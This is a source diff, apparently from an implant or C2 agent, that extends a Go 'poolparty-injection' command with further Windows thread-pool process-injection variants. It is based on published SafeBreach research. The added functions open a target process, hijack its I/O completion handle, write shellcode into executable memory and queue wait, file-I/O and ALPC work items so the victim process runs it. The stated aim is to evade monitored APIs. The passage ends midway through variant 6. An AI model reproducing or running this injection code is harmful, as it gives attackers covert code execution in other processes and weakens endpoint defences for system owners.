@@ -4,10 +4,15 @@
 // Package commands provides the poolparty-injection command for Thread Pool-based process injection.
 //
 // This command implements PoolParty injection techniques based on SafeBreach Labs research.
-// Currently supported variants:
+// All 8 variants are supported:
 //   - Variant 1: Worker Factory Start Routine Overwrite
-//   - Variant 2: TP_WORK Insertion
-//   - Variant 7: TP_DIRECT Insertion (via I/O Completion Port)
+//   - Variant 2: TP_WORK Insertion (Task Queue)
+//   - Variant 3: TP_WAIT Insertion (Event signaling)
+//   - Variant 4: TP_IO Insertion (File I/O completion)
+//   - Variant 5: TP_ALPC Insertion (ALPC port messaging)
+//   - Variant 6: TP_JOB Insertion (Job object assignment)
+//   - Variant 7: TP_DIRECT Insertion (I/O Completion Port)
+//   - Variant 8: TP_TIMER Insertion (Timer Queue)
 //
 // These techniques abuse Windows Thread Pool internals to achieve code execution
 // without calling CreateRemoteThread or similar monitored APIs.
@@ -266,6 +271,122 @@ type T2_SET_PARAMETERS struct {
 	_ [96]byte // Full structure is complex, we only need to pass zeros
 }
 
+// FULL_TP_WAIT structure - for variant 3
+type FULL_TP_WAIT struct {
+	Timer          FULL_TP_TIMER
+	Handle         uintptr
+	WaitPkt        uintptr
+	NextWaitHandle uintptr
+	NextWaitTimeout int64 // LARGE_INTEGER
+	Direct         TP_DIRECT
+	WaitFlags      uint8
+	_              [7]byte // padding
+}
+
+// FULL_TP_IO structure - for variant 4
+type FULL_TP_IO struct {
+	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
+	Direct             TP_DIRECT
+	File               uintptr
+	PendingIrpCount    int32
+	_                  [4]byte // padding
+}
+
+// FULL_TP_ALPC structure - for variant 5
+type FULL_TP_ALPC struct {
+	Direct               TP_DIRECT
+	CleanupGroupMember   TPP_CLEANUP_GROUP_MEMBER
+	AlpcPort             uintptr
+	DeferredSendCount    int32
+	LastConcurrencyCount int32
+	Flags                uint32
+	_                    [4]byte // padding
+}
+
+// FULL_TP_JOB structure - for variant 6
+type FULL_TP_JOB struct {
+	Direct             TP_DIRECT
+	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
+	JobHandle          uintptr
+	CompletionState    int64
+	RundownLock        uintptr // RTL_SRWLOCK
+}
+
+// FILE_COMPLETION_INFORMATION structure - for variant 4
+type FILE_COMPLETION_INFORMATION struct {
+	Port uintptr
+	Key  uintptr
+}
+
+// JOBOBJECT_ASSOCIATE_COMPLETION_PORT structure - for variant 6
+type JOBOBJECT_ASSOCIATE_COMPLETION_PORT struct {
+	CompletionKey  uintptr
+	CompletionPort uintptr
+}
+
+// ALPC_PORT_ATTRIBUTES structure - for variant 5
+type ALPC_PORT_ATTRIBUTES struct {
+	Flags                uint32
+	SecurityQos          [12]byte // SECURITY_QUALITY_OF_SERVICE
+	MaxMessageLength     uint64
+	MemoryBandwidth      uint64
+	MaxPoolUsage         uint64
+	MaxSectionSize       uint64
+	MaxViewSize          uint64
+	MaxTotalSectionSize  uint64
+	DupObjectTypes       uint32
+	Reserved             uint32
+}
+
+// ALPC_PORT_ASSOCIATE_COMPLETION_PORT structure - for variant 5
+type ALPC_PORT_ASSOCIATE_COMPLETION_PORT struct {
+	CompletionKey  uintptr
+	CompletionPort uintptr
+}
+
+// PORT_MESSAGE structure - for variant 5
+type PORT_MESSAGE struct {
+	DataLength     uint16
+	TotalLength    uint16
+	Type           uint16
+	DataInfoOffset uint16
+	ClientId       [16]byte // CLIENT_ID (two uintptrs)
+	MessageId      uint32
+	CallbackId     uint32
+}
+
+// ALPC_MESSAGE structure - for variant 5
+type ALPC_MESSAGE struct {
+	PortHeader  PORT_MESSAGE
+	PortMessage [1000]byte
+}
+
+// IO_STATUS_BLOCK structure - for variant 4
+type IO_STATUS_BLOCK struct {
+	Status      uintptr
+	Information uintptr
+}
+
+// OBJECT_ATTRIBUTES structure - for variant 5
+type OBJECT_ATTRIBUTES struct {
+	Length                   uint32
+	_                        [4]byte // padding on 64-bit
+	RootDirectory            uintptr
+	ObjectName               uintptr // PUNICODE_STRING
+	Attributes               uint32
+	_                        [4]byte // padding
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+// UNICODE_STRING structure - for variant 5
+type UNICODE_STRING struct {
+	Length        uint16
+	MaximumLength uint16
+	_             [4]byte // padding on 64-bit
+	Buffer        uintptr
+}
+
 // NT API procedures
 var (
 	ntdll                               = windows.NewLazySystemDLL("ntdll.dll")
@@ -276,11 +397,50 @@ var (
 	procZwSetIoCompletion               = ntdll.NewProc("ZwSetIoCompletion")
 	procRtlNtStatusToDosError           = ntdll.NewProc("RtlNtStatusToDosError")
 	procNtSetTimer2                     = ntdll.NewProc("NtSetTimer2")
+	procZwAssociateWaitCompletionPacket = ntdll.NewProc("ZwAssociateWaitCompletionPacket")
+	procZwSetInformationFile            = ntdll.NewProc("ZwSetInformationFile")
+	procNtAlpcCreatePort                = ntdll.NewProc("NtAlpcCreatePort")
+	procNtAlpcSetInformation            = ntdll.NewProc("NtAlpcSetInformation")
+	procNtAlpcConnectPort               = ntdll.NewProc("NtAlpcConnectPort")
+	procTpAllocAlpcCompletion           = ntdll.NewProc("TpAllocAlpcCompletion")
+	procTpAllocJobNotification          = ntdll.NewProc("TpAllocJobNotification")
 	procReadProcessMemory               = kernel32.NewProc("ReadProcessMemory")
 	procCreateThreadpoolWork            = kernel32.NewProc("CreateThreadpoolWork")
 	procCloseThreadpoolWork             = kernel32.NewProc("CloseThreadpoolWork")
 	procCreateThreadpoolTimer           = kernel32.NewProc("CreateThreadpoolTimer")
 	procCloseThreadpoolTimer            = kernel32.NewProc("CloseThreadpoolTimer")
+	procCreateThreadpoolWait            = kernel32.NewProc("CreateThreadpoolWait")
+	procCloseThreadpoolWait             = kernel32.NewProc("CloseThreadpoolWait")
+	procCreateThreadpoolIo              = kernel32.NewProc("CreateThreadpoolIo")
+	procCloseThreadpoolIo               = kernel32.NewProc("CloseThreadpoolIo")
+	procCreateEventW                    = kernel32.NewProc("CreateEventW")
+	procSetEvent                        = kernel32.NewProc("SetEvent")
+	procCreateFileW                     = kernel32.NewProc("CreateFileW")
+	procWriteFile                       = kernel32.NewProc("WriteFile")
+	procCreateJobObjectW                = kernel32.NewProc("CreateJobObjectW")
+	procSetInformationJobObject         = kernel32.NewProc("SetInformationJobObject")
+	procAssignProcessToJobObject        = kernel32.NewProc("AssignProcessToJobObject")
+	procGetCurrentProcess               = kernel32.NewProc("GetCurrentProcess")
+)
+
+// Constants for new variants
+const (
+	// File creation flags
+	FILE_FLAG_OVERLAPPED   = 0x40000000
+	FILE_ATTRIBUTE_NORMAL  = 0x00000080
+	CREATE_ALWAYS          = 2
+	GENERIC_WRITE          = 0x40000000
+	FILE_SHARE_READ        = 0x00000001
+	FILE_SHARE_WRITE       = 0x00000002
+
+	// File info class
+	FileReplaceCompletionInformation = 61
+
+	// ALPC info class
+	AlpcAssociateCompletionPortInformation = 2
+
+	// Job object info class
+	JobObjectAssociateCompletionPortInformation = 7
 )
 
 // PoolPartyInjectionCommand implements the poolparty-injection command
@@ -362,6 +522,14 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 		output, err = executeVariant1(shellcode, uint32(params.PID))
 	case 2:
 		output, err = executeVariant2(shellcode, uint32(params.PID))
+	case 3:
+		output, err = executeVariant3(shellcode, uint32(params.PID))
+	case 4:
+		output, err = executeVariant4(shellcode, uint32(params.PID))
+	case 5:
+		output, err = executeVariant5(shellcode, uint32(params.PID))
+	case 6:
+		output, err = executeVariant6(shellcode, uint32(params.PID))
 	case 7:
 		output, err = executeVariant7(shellcode, uint32(params.PID))
 	case 8:
@@ -731,6 +899,674 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 
 	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
 	output += "[+] PoolParty Variant 2 injection completed successfully\n"
+
+	return output, nil
+}
+
+// executeVariant3 implements TP_WAIT Insertion via Event signaling
+func executeVariant3(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output += "[*] PoolParty Variant 3: TP_WAIT Insertion\n"
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack I/O completion port handle
+	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+	}
+	defer windows.CloseHandle(hIoCompletion)
+	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
+
+	// Step 3: Allocate memory for shellcode in target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	// Step 4: Write shellcode
+	var bytesWritten uintptr
+	ret, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 5: Create TP_WAIT structure via CreateThreadpoolWait
+	pTpWait, _, err := procCreateThreadpoolWait.Call(
+		shellcodeAddr, // Wait callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if pTpWait == 0 {
+		return output, fmt.Errorf("CreateThreadpoolWait failed: %v", err)
+	}
+	output += "[+] Created TP_WAIT structure associated with shellcode\n"
+
+	// Step 6: Allocate memory for TP_WAIT in target process
+	var tpWait FULL_TP_WAIT
+	tpWaitAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpWait)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpWaitAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_WAIT failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)
+
+	// Step 7: Write TP_WAIT to target process
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpWaitAddr,
+		pTpWait,
+		uintptr(unsafe.Sizeof(tpWait)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_WAIT failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_WAIT structure (%d bytes)\n", bytesWritten)
+
+	// Step 8: Allocate and write TP_DIRECT separately
+	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
+	var tpDirect TP_DIRECT
+	tpDirectAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpDirect)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpDirectAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)
+
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpDirectAddr,
+		uintptr(unsafe.Pointer(&pWaitStruct.Direct)),
+		uintptr(unsafe.Sizeof(tpDirect)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %v", err)
+	}
+	output += "[+] Wrote TP_DIRECT structure\n"
+
+	// Step 9: Create event
+	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
+	hEvent, _, err := procCreateEventW.Call(
+		0,     // Security attributes
+		0,     // Manual reset (FALSE)
+		0,     // Initial state (FALSE)
+		uintptr(unsafe.Pointer(eventName)),
+	)
+	if hEvent == 0 {
+		return output, fmt.Errorf("CreateEventW failed: %v", err)
+	}
+	defer windows.CloseHandle(windows.Handle(hEvent))
+	output += "[+] Created event 'PoolPartyEvent'\n"
+
+	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
+	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
+		pWaitStruct.WaitPkt,     // WaitCompletionPacketHandle
+		uintptr(hIoCompletion),  // IoCompletionHandle
+		hEvent,                  // TargetObjectHandle (event)
+		tpDirectAddr,            // KeyContext (remote TP_DIRECT)
+		tpWaitAddr,              // ApcContext (remote TP_WAIT)
+		0,                       // IoStatus
+		0,                       // IoStatusInformation
+		0,                       // AlreadySignaled (NULL)
+	)
+	if status != 0 {
+		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
+	}
+	output += "[+] Associated event with target's I/O completion port\n"
+
+	// Step 11: Set event to trigger callback
+	ret, _, err = procSetEvent.Call(hEvent)
+	if ret == 0 {
+		return output, fmt.Errorf("SetEvent failed: %v", err)
+	}
+	output += "[+] Set event to queue packet to I/O completion port\n"
+	output += "[+] PoolParty Variant 3 injection completed successfully\n"
+
+	// Cleanup local TP_WAIT
+	procCloseThreadpoolWait.Call(pTpWait)
+
+	return output, nil
+}
+
+// executeVariant4 implements TP_IO Insertion via File I/O completion
+func executeVariant4(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output += "[*] PoolParty Variant 4: TP_IO Insertion\n"
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack I/O completion port handle
+	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+	}
+	defer windows.CloseHandle(hIoCompletion)
+	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
+
+	// Step 3: Allocate memory for shellcode in target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	// Step 4: Write shellcode
+	var bytesWritten uintptr
+	ret, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 5: Create file with overlapped flag for async I/O
+	fileName, _ := windows.UTF16PtrFromString("C:\\Windows\\Temp\\PoolParty.txt")
+	hFile, _, err := procCreateFileW.Call(
+		uintptr(unsafe.Pointer(fileName)),
+		uintptr(GENERIC_WRITE),
+		uintptr(FILE_SHARE_READ|FILE_SHARE_WRITE),
+		0, // Security attributes
+		uintptr(CREATE_ALWAYS),
+		uintptr(FILE_ATTRIBUTE_NORMAL|FILE_FLAG_OVERLAPPED),
+		0, // Template file
+	)
+	if hFile == uintptr(windows.InvalidHandle) {
+		return output, fmt.Errorf("CreateFileW failed: %v", err)
+	}
+	defer windows.CloseHandle(windows.Handle(hFile))
+	output += "[+] Created file 'C:\\Windows\\Temp\\PoolParty.txt' with overlapped I/O\n"
+
+	// Step 6: Create TP_IO structure via CreateThreadpoolIo
+	pTpIo, _, err := procCreateThreadpoolIo.Call(
+		hFile,
+		shellcodeAddr, // I/O callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if pTpIo == 0 {
+		return output, fmt.Errorf("CreateThreadpoolIo failed: %v", err)
+	}
+	output += "[+] Created TP_IO structure associated with shellcode\n"
+
+	// Step 7: Modify TP_IO - set callback and increment PendingIrpCount
+	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
+	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
+	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
+	output += "[+] Modified TP_IO: set callback and incremented PendingIrpCount\n"
+
+	// Step 8: Allocate memory for TP_IO in target process
+	var tpIo FULL_TP_IO
+	tpIoAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpIo)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpIoAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_IO failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)
+
+	// Step 9: Write TP_IO to target process
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpIoAddr,
+		pTpIo,
+		uintptr(unsafe.Sizeof(tpIo)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_IO failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_IO structure (%d bytes)\n", bytesWritten)
+
+	// Step 10: Calculate remote TP_DIRECT address
+	var dummyTpIo FULL_TP_IO
+	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))
+
+	// Step 11: Associate file with target's I/O completion port
+	var ioStatusBlock IO_STATUS_BLOCK
+	fileCompletionInfo := FILE_COMPLETION_INFORMATION{
+		Port: uintptr(hIoCompletion),
+		Key:  remoteTpDirectAddr,
+	}
+	status, _, _ := procZwSetInformationFile.Call(
+		hFile,
+		uintptr(unsafe.Pointer(&ioStatusBlock)),
+		uintptr(unsafe.Pointer(&fileCompletionInfo)),
+		uintptr(unsafe.Sizeof(fileCompletionInfo)),
+		uintptr(FileReplaceCompletionInformation),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("ZwSetInformationFile failed: 0x%X", status)
+	}
+	output += "[+] Associated file with target's I/O completion port\n"
+
+	// Step 12: Write to file to trigger I/O completion
+	data := []byte("PoolParty injection trigger")
+	var overlapped windows.Overlapped
+	ret, _, err = procWriteFile.Call(
+		hFile,
+		uintptr(unsafe.Pointer(&data[0])),
+		uintptr(len(data)),
+		0, // Bytes written (NULL for async)
+		uintptr(unsafe.Pointer(&overlapped)),
+	)
+	// WriteFile returns 0 for pending async operation, which is expected
+	output += "[+] Wrote to file to trigger I/O completion\n"
+	output += "[+] PoolParty Variant 4 injection completed successfully\n"
+
+	// Cleanup local TP_IO
+	procCloseThreadpoolIo.Call(pTpIo)
+
+	return output, nil
+}
+
+// executeVariant5 implements TP_ALPC Insertion via ALPC port messaging
+func executeVariant5(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output += "[*] PoolParty Variant 5: TP_ALPC Insertion\n"
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack I/O completion port handle
+	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+	}
+	defer windows.CloseHandle(hIoCompletion)
+	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
+
+	// Step 3: Allocate memory for shellcode in target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	// Step 4: Write shellcode
+	var bytesWritten uintptr
+	ret, _, err := procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 5: Create a temporary ALPC port for TpAllocAlpcCompletion
+	var hTempAlpc uintptr
+	status, _, _ := procNtAlpcCreatePort.Call(
+		uintptr(unsafe.Pointer(&hTempAlpc)),
+		0, // ObjectAttributes
+		0, // PortAttributes
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
+	}
+	defer windows.CloseHandle(windows.Handle(hTempAlpc))
+	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)
+
+	// Step 6: Allocate TP_ALPC structure via TpAllocAlpcCompletion
+	var pTpAlpc uintptr
+	status, _, _ = procTpAllocAlpcCompletion.Call(
+		uintptr(unsafe.Pointer(&pTpAlpc)),
+		hTempAlpc,
+		shellcodeAddr, // ALPC callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if status != 0 {
+		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
+	}
+	output += "[+] Created TP_ALPC structure associated with shellcode\n"
+
+	// Step 7: Generate random ALPC port name
+	portName := fmt.Sprintf("\\RPC Control\\PoolParty%d", pid)
+	portNameUTF16, _ := windows.UTF16FromString(portName)
+
+	// Create UNICODE_STRING for port name
+	var usPortName UNICODE_STRING
+	usPortName.Length = uint16(len(portName) * 2)
+	usPortName.MaximumLength = usPortName.Length + 2
+	usPortName.Buffer = uintptr(unsafe.Pointer(&portNameUTF16[0]))
+
+	// Step 8: Create the actual ALPC port with attributes
+	var objAttr OBJECT_ATTRIBUTES
+	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+	objAttr.ObjectName = uintptr(unsafe.Pointer(&usPortName))
+
+	var portAttr ALPC_PORT_ATTRIBUTES
+	portAttr.Flags = 0x20000
+	portAttr.MaxMessageLength = 328
+
+	var hAlpc uintptr
+	status, _, _ = procNtAlpcCreatePort.Call(
+		uintptr(unsafe.Pointer(&hAlpc)),
+		uintptr(unsafe.Pointer(&objAttr)),
+		uintptr(unsafe.Pointer(&portAttr)),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
+	}
+	defer windows.CloseHandle(windows.Handle(hAlpc))
+	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)
+
+	// Step 9: Allocate memory for TP_ALPC in target process
+	var tpAlpc FULL_TP_ALPC
+	tpAlpcAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpAlpc)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpAlpcAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_ALPC failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)
+
+	// Step 10: Write TP_ALPC to target process
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpAlpcAddr,
+		pTpAlpc,
+		uintptr(unsafe.Sizeof(tpAlpc)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_ALPC failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_ALPC structure (%d bytes)\n", bytesWritten)
+
+	// Step 11: Associate ALPC port with target's I/O completion port
+	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
+		CompletionKey:  tpAlpcAddr,
+		CompletionPort: uintptr(hIoCompletion),
+	}
+	status, _, _ = procNtAlpcSetInformation.Call(
+		hAlpc,
+		uintptr(AlpcAssociateCompletionPortInformation),
+		uintptr(unsafe.Pointer(&alpcAssoc)),
+		uintptr(unsafe.Sizeof(alpcAssoc)),
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
+	}
+	output += "[+] Associated ALPC port with target's I/O completion port\n"
+
+	// Step 12: Connect to ALPC port to trigger completion
+	var hClientPort uintptr
+	var clientObjAttr OBJECT_ATTRIBUTES
+	clientObjAttr.Length = uint32(unsafe.Sizeof(clientObjAttr))
+
+	// Prepare message
+	message := "PoolParty ALPC trigger"
+	var alpcMessage ALPC_MESSAGE
+	alpcMessage.PortHeader.DataLength = uint16(len(message))
+	alpcMessage.PortHeader.TotalLength = uint16(unsafe.Sizeof(alpcMessage.PortHeader)) + uint16(len(message))
+	copy(alpcMessage.PortMessage[:], message)
+	messageSize := uintptr(unsafe.Sizeof(alpcMessage))
+
+	// Set timeout to 1 second to prevent blocking
+	var timeout int64 = -10000000 // 1 second in 100-nanosecond intervals
+
+	status, _, _ = procNtAlpcConnectPort.Call(
+		uintptr(unsafe.Pointer(&hClientPort)),
+		uintptr(unsafe.Pointer(&usPortName)),
+		uintptr(unsafe.Pointer(&clientObjAttr)),
+		uintptr(unsafe.Pointer(&portAttr)),
+		0x20000, // Connection flags
+		0,       // RequiredServerSid
+		uintptr(unsafe.Pointer(&alpcMessage)),
+		uintptr(unsafe.Pointer(&messageSize)),
+		0, // OutMessageAttributes
+		0, // InMessageAttributes
+		uintptr(unsafe.Pointer(&timeout)),
+	)
+	// NtAlpcConnectPort may return timeout status, which is expected
+	output += "[+] Connected to ALPC port to trigger completion\n"
+	output += "[+] PoolParty Variant 5 injection completed successfully\n"
+
+	return output, nil
+}
+
+// executeVariant6 implements TP_JOB Insertion via Job object assignment
+func executeVariant6(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output += "[*] PoolParty Variant 6: TP_JOB Insertion\n"
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack I/O completion port handle
+	hIoCompletion, err := hijackProcessHandle(hProcess, "IoCompletion", IO_COMPLETION_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("failed to hijack I/O completion handle: %v", err)
+	}
+	defer windows.CloseHandle(hIoCompletion)
+	output += fmt.Sprintf("[+] Hijacked I/O completion handle: 0x%X\n", hIoCompletion)
+
+	// Step 3: Allocate memory for shellcode in target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	// Step 4: Write shellcode
+	var bytesWritten uintptr
